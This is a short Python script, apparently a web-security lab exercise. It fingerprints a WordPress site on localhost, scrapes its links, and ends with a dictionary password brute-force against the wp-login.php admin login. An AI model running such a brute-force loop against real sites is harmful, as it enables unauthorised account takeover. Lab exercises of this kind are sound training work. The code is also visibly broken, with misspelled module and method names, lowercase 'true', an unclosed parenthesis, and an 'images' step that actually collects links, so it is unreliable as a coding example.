
# check is web portal is up by using GET request

import requests
requests.get("http://127.0.0.1")

# which server is being used?
req_ = request.get("http://127.0.0.1")
req_.headers

# print response headers of GET response
req_.headers

# get text content of localhost homepage. Also, can you tell which CMS is running on localhost?
req_.content
req_.text
# answer: wp running as cms on local host

# print the response in a pretty form using Beautiful Soup.
from bs4 import BeautifulSoup

soup = BeautifulSoup(req_.text, 'html.parser')
print(soup.prettify())

# print the title of the web portal hosted on localhost
print(soup.title)

# print the urls for the images present on the homepage.
home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.content, "html.parser")

imgs = soup.find_all("a", href=true)
imgs_href = []

for img in imgs:
	imgs_href.appenmd(img['href'])

imgs_set = set(imgs_href)

for img in imgs_set:
	print(img)

# scrape all urls from the homepage of localhost and pring unique urls
word_p = requets.get("http://localhost/wp-admin/")
soup_word_p = BeautifulSoup(word_p.text, "html.parser")
print(soup_word_p(word_p.text, "html.parser")
print(soup_word_p.prittify())

# can you access the admin section (/wp-admin/) of the cms?
passfile = "dictionary.txt"

with open(passfile, "r") as f:
	for word in f:
		word = word.strip("\n")
		trying_ = request.post("http://localhost/wp-login.php", data={"log":"admin","pwd":word})

		if "ERROR" not in trying_.txt:
			print("Success, password is: " + word)
			break
		else:
			print("Wrong password: " + word)